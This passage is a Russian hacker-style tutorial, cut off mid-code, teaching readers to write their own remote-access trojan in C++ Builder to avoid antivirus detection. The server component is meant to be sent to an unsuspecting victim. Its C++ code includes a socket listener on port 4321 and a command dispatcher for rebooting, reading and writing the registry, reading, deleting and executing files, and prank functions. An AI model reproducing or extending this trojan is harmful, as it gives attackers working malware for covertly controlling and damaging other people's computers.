<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd">
<html><head><meta name="qrichtext" content="1" /><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><style type="text/css">
p, li { white-space: pre-wrap; }
</style></head><body style=" font-family:'DejaVu Sans'; font-size:11pt; font-weight:400; font-style:normal;">
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'tahoma'; font-size:13px; color:#303830; background-color:#ffffff;">Сегодня мы будем учиться писать троянчик. Небольшой, но СВОЙ! Почему? Конечно-конечно, троянов в сети навалом, но рано или поздно они =вдруг= начинают определяться антивирусами, приходиться ждать апдейта етц... Ожидание - самый скучный повод. Не знаю как вы, но я ждать не люблю, да и использовать чужие трояны это совсем не по-}{аЦкERR'ски. Короче, пишем свой троян и точка.    После точки, как учили в школе, пишем с большой буквы... Так вот, о чем я? Писать я буду, как обычно, на своем любимом Builder C++. Если у вас руки растут не оттуда, откуда у меня ноги, то без проблем все переделаете под Дельфи, если припрет конечно...    Естественно, наш троян будет состоять из 2х частей =) Серверной (отправляемой как подарок ламерюге) и клиентской (оставим себе на память). Надо сказать, что я давно не юзал никакие трояны, так что не знаю что там сейчас они умеют делать, может уже и коврик под мышкой научились двигать или корпус компа открывать. Мы же пишем &quot;троянчик&quot;, поэтому делать он будет только следующее:  1) читать, удалять, запускать файлы на удаленном компьютере  2) работать с реестром на удаленном компьютере  3) ну и традиционный набор разных бесполезных функций, типа открытие CD-ROM'a, смена клавишей мышки etc.    Перекурили и поехали!  Использовать будем стандартные компоненты TClientSocket и TServerSocket.    Начнем с клиента. Набрасываем простенький интерфейс и приступаем к реализации. Управлять удаленным компьютером будем с помощью специальных команд. Для примера пускай структура их будет такая:  Nпараметры. N - цифра. Каждому действию присвоен свой код. Т.е. например 1 - перезагрузка, 2 - чтение файла и т.д. Главное чтоб было однозначное соответствие между тем что хотим сделать (команда передаваемая клиентом) и тем что выполняет программа (обработка команды на сервере). С этим разобрались. Теперь параметры. Бывает мало передать только номер команды. Конечно, чтобы перезагрузить компьютер никаких параметров не надо (хотя можно и здесь передать параметры в функцию перезагрузки), но как например реализовать удаление файла не передавая параметра? Мы передаем команду на удаление файла, но какого?! Для этого будем использовать параметры. В качестве параметра в данном случае будет передаваться имя файла. Бывает, что мало передать один параметр. Например надо прочитать n-строчек из file.txt. Здесь необходимо передать 2 параметра. В нашем примере параметры отделяются друг от друга комбинацией &quot;\r\n&quot; - перевод каретки. Объясняется данная структура тем, что в сервере мы сначала помещаем полученную команду в TStringList и потом можем спокойно обращаться к любой строчке этого TStringList'а через свойство Strings</span><span style=" font-family:'tahoma'; font-size:13px; font-style:italic; color:#303830; background-color:#ffffff;">, где i-номер строчки, а соответственно и номер параметра. В общем, это вещи достаточно очевидные. <br /> <br />Вот так, вроде бы только начав писать клиентскую часть мы ее уже почти и закончили! Ведь на самом деле ничего кроме отсылки команд и приема ответов от сервера она делать и не должна. Для приема ответов просто создадим поле TMemo и добавим обработчик события OnRead нашего компонента TClientSocket: <br /> <br /></span></p>
<p style=" margin-top:10px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; background-color:#f4f4f0;"><span style=" font-family:'tahoma'; font-size:10px; font-weight:600; color:#c0c0c0;">C++</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">void</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> __fastcall TForm1::</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">TrojControllerRead</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">TObject *Sender,<br />      TCustomWinSocket *Socket</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">{</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />Memo2-&gt;Lines-&gt;Add</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">Socket-&gt;ReceiveText</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">())</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">}</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /> </span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'tahoma'; font-size:13px; color:#303830; background-color:#ffffff;">Вот и все. Клиент законен! Переходим к серверу...    Сервер будет чуть пообъемнее. Вначале определимся с задачами:  1) получение команд  2) их обработка и выполнение соответствующих действий  3) отсылка ответа клиенту (должны же мы знать что происходит на сервере)  Реализуем...    Во-первых, никакого визуального оформления естественно не будет =) Поэтому на форму поместим только 1 компонент: TServerSocket. Инициализацию его проведем в функции FormCreate(). Хотя можно было бы просто прописать 2 параметра в Object Inspector'е. Но раз уж сделали, так сделали =)    </span></p>
<p style=" margin-top:10px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; background-color:#f4f4f0;"><span style=" font-family:'tahoma'; font-size:10px; font-weight:600; color:#c0c0c0;">C++</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">void</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> __fastcall TForm1::</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">FormCreate</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">TObject *Sender</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">{</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// ServSckt - наш компонент TServerSocket</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />ServSckt-&gt;Port = </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">4321</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />ServSckt-&gt;Active = </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">true</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">}</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /> </span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'tahoma'; font-size:13px; color:#303830; background-color:#ffffff;">Итак, указали порт, активизировали сокет. Теперь обрабатываем событие ClientRead, т.е. получение данных сокетом. Комментирую на примере:    </span></p>
<p style=" margin-top:10px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; background-color:#f4f4f0;"><span style=" font-family:'tahoma'; font-size:10px; font-weight:600; color:#c0c0c0;">C++</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">void</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> __fastcall TForm1::</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">ServScktClientRead</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">TObject *Sender,<br />      TCustomWinSocket *Socket</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">{</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />RecCommand</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">Socket-&gt;ReceiveText</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">())</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">; </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// пишем для наглядности функцию обработки поступившей</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />                                  </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// информации, которую передаем как параметр этой функции</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">}</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">//---------------------------------------------------------------------------</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// собственно сама функция: Rec - сокращение от Recognize. Можно по-другому назвать =)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">void</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> TForm1::</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">RecCommand</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">String received</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">{</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">int</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> cn;<br />TTrojanUtilites Utilz;  </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// создаем объект наших утилит </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />Utilz.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">Sock</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">=ServSckt;    </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// необходимо для отсылки ответа клиенту, так как сокет у нас</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />                </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// находится на форме, а TTrojanUtilites не имеет никакого отношения</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />                </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// к форме. Просто передаем указатель на TServerSocket</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />String temp;<br />temp=received;<br />temp.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">Delete</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">2</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">,temp.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">Length</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">())</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;   </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// получаем первый символ сообщения - номер команды</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />cn = StrToInt</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">temp</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;       </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// преобразуем в число</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />received.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">Delete</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">1</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">,</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">1</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;      </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// удаляем код команды - остаются одни параметры</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">switch</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">cn</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">{</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">         </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// в соответсвии с полученой командой </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />                                </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// запускаем соотвествующую утилиту </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">case</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">1</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> : Utilz.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">RestartMachine</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">()</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">; </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">break</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;  </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// перезагрузка</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">case</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">2</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> : Utilz.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">WriteRegistry</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">received</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">; </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">break</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;  </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// запись в реестр</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">case</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">3</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> : Utilz.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">ReadRegistry</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">received</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">; </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">break</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;   </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// чтение реестра</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">case</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">4</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> : Utilz.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">SendFile</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">received</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">; </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">break</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;       </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// чтение файла</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">case</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">5</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> : Utilz.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">DeleteFile</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">received</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">; </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">break</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;     </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// удаление файла </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">case</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">6</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> : Utilz.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">ExecuteFile</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">received</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">; </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">break</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;    </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// запуск файла </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">case</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">7</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> : Utilz.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">OpenCloseCD</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">; </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">break</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;            </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// открытие/закрытие CD-ROM</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">case</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">8</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> : Utilz.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">HideMouse</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">()</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">; </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">break</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;            </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// прячем курсор мыши </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">case</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">9</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> : Utilz.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">SwapMouseButtons</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">()</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">; </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">break</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;       </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// переключаем кнопки мыши </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">default</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">:<br />SendMsgToClient</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;Неправильная команда!&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> ; </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// получена недопустимая команда</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />                                           </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// информируем клиента об этом</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">}</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">}</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /> </span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'tahoma'; font-size:13px; color:#303830; background-color:#ffffff;">Теперь немного подробнее. Мы пишем специальный класс TTrojanUtilites, в котором реализуем все необходимые функции. В RecognizeCommand (String Directive) мы только отделяем команду от параметров и запускаем необходимые методы TTrojanUtilites, передавая по необходимости в них параметры.    Реализация TTrojanUtilites есть то, чем мы сейчас займемся. Класс оформим в отдельном модуле, не забудьте подключить его.    Поехали... Во-первых, подключаем #include &lt;MMSystem.hpp&gt; - необходимо для реализации работы с CD-ROM'ом. Далее пишем все необходимые методы.    Краткие комментарии на примере:    </span></p>
<p style=" margin-top:10px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; background-color:#f4f4f0;"><span style=" font-family:'tahoma'; font-size:10px; font-weight:600; color:#c0c0c0;">C++</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">void</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> TTrojanUtilites::</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">OpenCloseCD</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">()</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">{</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />TMCI_Open_Parms OpenParm;<br />TMCI_Generic_Parms  GenParm;<br />TMCI_Set_Parms SetParm;<br />Cardinal DI;<br />OpenParm.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">dwCallback</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> = </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">0</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />OpenParm.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">lpstrDeviceType</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> = </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;CDAudio&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />mciSendCommand</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">0</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">, MCI_OPEN, MCI_OPEN_TYPE, </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">Longint</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">&amp;OpenParm</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">))</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />DI = OpenParm.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">wDeviceID</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">if</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">!CDROMOPEN</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">{</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />        mciSendCommand</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">DI, MCI_SET, MCI_SET_DOOR_OPEN, </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">Longint</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">&amp;SetParm</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">))</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />        CDROMOPEN = </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">true</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">; </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// открыть</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">}</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">else</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">{</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />        mciSendCommand</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">DI, MCI_SET, MCI_SET_DOOR_CLOSED, 